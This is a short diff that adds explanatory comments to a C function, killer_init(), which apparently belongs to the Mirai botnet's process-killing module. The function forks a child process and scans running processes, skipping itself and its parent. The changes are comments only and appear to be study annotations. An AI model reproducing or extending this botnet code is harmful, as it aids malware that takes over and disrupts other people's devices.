@@ -29,7 +29,7 @@ void killer_init(void)
     struct sockaddr_in tmp_bind_addr;
 
     // Let parent continue on main thread
-    killer_pid = fork();
+    killer_pid = fork();            //Create child process to stay in killer_init(), parent process returns to main()
     if (killer_pid > 0 || killer_pid == -1)
         return;
 
@@ -199,7 +199,7 @@ void killer_init(void)
                 table_lock_val(TABLE_KILLER_ANIME);
 
                 // Skip this file if its realpath == killer_realpath
-                if (pid == getpid() || pid == getppid() || util_strcmp(realpath, killer_realpath))
+                if (pid == getpid() || pid == getppid() || util_strcmp(realpath, killer_realpath))      //getpid() gets the id of current process, getppid() yest the id of the parent process, 
                     continue;
 
                 if ((fd = open(realpath, O_RDONLY)) == -1)
